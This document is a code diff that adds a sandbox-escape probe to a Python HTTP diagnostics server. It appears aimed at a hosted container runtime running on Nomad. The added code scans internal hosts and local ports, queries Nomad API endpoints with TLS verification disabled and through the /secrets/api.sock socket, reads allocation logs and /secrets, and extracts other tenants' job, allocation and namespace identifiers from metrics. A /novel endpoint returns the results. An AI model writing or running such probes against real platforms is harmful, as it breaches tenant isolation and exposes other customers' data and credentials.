@@ -392,6 +392,146 @@ def gather_diagnostics():
     return data
 
 
+
+def http_get_unix(sock_path, path="/", timeout=3):
+    try:
+        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect(sock_path)
+        req = f"GET {path} HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
+        s.sendall(req.encode())
+        data = b""
+        while len(data) < 200000:
+            chunk = s.recv(65536)
+            if not chunk:
+                break
+            data += chunk
+        s.close()
+        return {"ok": True, "response_snippet": data.decode(errors="replace")[:120000]}
+    except Exception as e:
+        return {"ok": False, "error": str(e)}
+
+
+def novel_sandbox_probe():
+    """Focus: sandbox bypass / cross-tenant orchestration disclosure."""
+    infra, hosts_text = parse_infra_hosts_from_etc_hosts()
+    # Identify which infra ULA is the local host agent
+    host_internal = "169.254.1.2"
+    open_ulas = []
+    for h in infra:
+        r4646 = tcp_connect(h["ip"], 4646, timeout=1.2)
+        r22 = tcp_connect(h["ip"], 22, timeout=1.2)
+        if r4646.get("open") or r22.get("open"):
+            open_ulas.append({"ip": h["ip"], "names": h["names"], "4646": r4646, "22": r22})
+
+    # Extended Nomad GETs with large body capture (metrics cross-tenant labels)
+    nomad_host = open_ulas[0]["ip"] if open_ulas else None
+    large_paths = [
+        "/v1/metrics",
+        "/v1/agent/health",
+        "/v1/acl/token/self",
+        "/v1/namespaces",
+        "/v1/status/leader",
+        "/v1/status/peers",
+        "/v1/agent/members",
+        "/v1/nodes?resources=false",
+        "/v1/jobs?meta=true",
+    ]
+    network_nomad = {}
+    if nomad_host:
+        for path in large_paths:
+            # reuse test_nomad_api single-path style with bigger buffer
+            try:
+                s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+                s.settimeout(8)
+                s.connect((nomad_host, 4646))
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                ss = ctx.wrap_socket(s)
+                req = f"GET {path} HTTP/1.1\r\nHost: [{nomad_host}]\r\nConnection: close\r\n\r\n"
+                ss.sendall(req.encode())
+                data = b""
+                while len(data) < 250000:
+                    chunk = ss.recv(65536)
+                    if not chunk:
+                        break
+                    data += chunk
+                ss.close()
+                network_nomad[path] = {"ok": True, "bytes": len(data), "response_snippet": data.decode(errors="replace")[:120000]}
+            except Exception as e:
+                network_nomad[path] = {"ok": False, "error": str(e)}
+
+    unix_paths = [
+        "/v1/agent/self",
+        "/v1/agent/members",
+        "/v1/agent/health",
+        "/v1/metrics",
+        "/v1/status/leader",
+        "/v1/status/peers",
+        "/v1/nodes",
+        "/v1/jobs",
+        "/v1/acl/token/self",
+        "/v1/namespaces",
+    ]
+    unix_nomad = {path: http_get_unix("/secrets/api.sock", path) for path in unix_paths}
+
+    # mystery listener 22557 + common sidecar ports
+    mystery = {}
+    for port in [22557, 8081, 8082, 9090, 9102, 13133, 4317, 4318, 8888, 8126]:
+        mystery[str(port)] = {
+            "tcp": tcp_connect("127.0.0.1", port, timeout=0.7),
+            "http": http_get_raw("127.0.0.1", port, path="/", timeout=1.5) if True else None,
+        }
+        # if open, try a few paths
+        if mystery[str(port)]["tcp"].get("open"):
+            for path in ["/", "/health", "/metrics", "/v1/agent/self", "/debug/vars"]:
+                mystery[str(port)][f"get_{path}"] = http_get_raw("127.0.0.1", port, path=path, timeout=1.5)
+
+    # host.containers.internal identity check
+    host_scan = probe_hosts(["169.254.1.2", "host.containers.internal"], ports=[22, 4646, 4647, 8500])
+
+    # sidecar logs (own alloc only) - may reveal sidecar purpose
+    sidecar_log = try_read("/alloc/logs/sidecar.stdout.0", 4000)
+    sidecar_err = try_read("/alloc/logs/sidecar.stderr.0", 2000)
+    preflight = try_read("/alloc/logs/preflight.stdout.0", 2000)
+
+    # Parse metrics labels for cross-tenant evidence
+    cross_tenant = {"remote_service_ids": set(), "job_ids": set(), "alloc_ids": set(), "hosts": set(), "namespaces": set()}
+    metrics_body = (network_nomad.get("/v1/metrics") or {}).get("response_snippet") or ""
+    # strip HTTP headers
+    if "\r\n\r\n" in metrics_body:
+        metrics_body = metrics_body.split("\r\n\r\n", 1)[1]
+    # chunked: crude extract JSON object
+    import re as _re
+    for m in _re.finditer(r'"remote_service_id":"([^"]+)"', metrics_body):
+        cross_tenant["remote_service_ids"].add(m.group(1))
+    for m in _re.finditer(r'"job":"([^"]+)"', metrics_body):
+        cross_tenant["job_ids"].add(m.group(1))
+    for m in _re.finditer(r'"alloc_id":"([^"]+)"', metrics_body):
+        cross_tenant["alloc_ids"].add(m.group(1))
+    for m in _re.finditer(r'"host":"([^"]+)"', metrics_body):
+        cross_tenant["hosts"].add(m.group(1))
+    for m in _re.finditer(r'"namespace":"([^"]+)"', metrics_body):
+        cross_tenant["namespaces"].add(m.group(1))
+    cross_tenant = {k: sorted(v) for k, v in cross_tenant.items()}
+
+    return {
+        "hypothesis": "host.containers.internal Nomad agent reachable from customer Runtime sandbox; /v1/metrics may disclose other tenants' alloc labels; /secrets/api.sock may differ in ACL",
+        "open_infra_ulas": open_ulas,
+        "host_containers_internal_scan": host_scan,
+        "network_nomad_large": network_nomad,
+        "unix_socket_nomad": unix_nomad,
+        "mystery_local_ports": mystery,
+        "sidecar_stdout": sidecar_log,
+        "sidecar_stderr": sidecar_err,
+        "preflight_stdout": preflight,
+        "cross_tenant_metrics_labels": cross_tenant,
+        "secrets_listing": list_tree("/secrets"),
+        "api_sock_stat": try_run(["sh", "-c", "ls -la /secrets/api.sock; stat /secrets/api.sock; file /secrets/api.sock 2>/dev/null || true"]),
+    }
+
+
 class Handler(http.server.BaseHTTPRequestHandler):
     def _json(self, data, code=200):
         body = json.dumps(data, indent=2, default=str).encode()
@@ -403,6 +543,9 @@ class Handler(http.server.BaseHTTPRequestHandler):
 
     def do_GET(self):
         try:
+            if self.path.startswith("/novel"):
+                self._json(novel_sandbox_probe())
+                return
             if self.path.startswith("/deep"):
                 self._json(deep_dive())
                 return
